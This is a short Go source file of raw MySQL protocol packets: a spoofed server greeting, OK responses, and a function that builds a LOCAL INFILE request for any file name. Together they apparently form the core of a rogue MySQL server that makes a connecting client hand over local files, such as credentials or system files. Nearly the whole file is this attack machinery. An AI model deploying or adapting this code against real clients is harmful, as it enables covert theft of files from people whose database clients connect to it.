package packets

var (
	MySQLGreeting = []byte{
		0x5b, 0x00, 0x00, 0x00, 0x0a, 0x35, 0x2e, 0x36,
		0x2e, 0x32, 0x38, 0x2d, 0x30, 0x75, 0x62, 0x75,
		0x6e, 0x74, 0x75, 0x30, 0x2e, 0x31, 0x34, 0x2e,
		0x30, 0x34, 0x2e, 0x31, 0x00, 0x2d, 0x00, 0x00,
		0x00, 0x40, 0x3f, 0x59, 0x26, 0x4b, 0x2b, 0x34,
		0x60, 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x7f,
		0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x59, 0x5f,
		0x52, 0x5f, 0x63, 0x55, 0x60, 0x64, 0x53, 0x52,
		0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e,
		0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61,
		0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00,
	}
	MySQLFirstResponseOK = []byte{
		0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02,
		0x00, 0x00, 0x00,
	}
	MySQLSecondResponseOK = []byte{
		0x07, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x02,
		0x00, 0x00, 0x00,
	}
)

func MySQLGetFile(infile string) []byte {
	return append([]byte{
		byte(len(infile) + 1),
		0x00, 0x00, 0x01, 0xfb,
	}, infile...)
}
